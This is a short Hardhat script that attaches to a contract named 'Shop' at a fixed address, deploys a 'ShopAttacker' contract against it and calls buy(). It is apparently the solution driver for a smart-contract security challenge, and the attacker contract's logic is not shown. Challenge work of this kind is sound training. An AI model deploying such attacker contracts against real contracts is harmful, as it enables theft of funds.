import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x52B2fF047a8625da1D771CB7c08e8b83374F0eF9";
const CONTRACT_NAME = "Shop";
const ATTACKER_NAME = "ShopAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();

  const tx = await attackerContract.buy();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
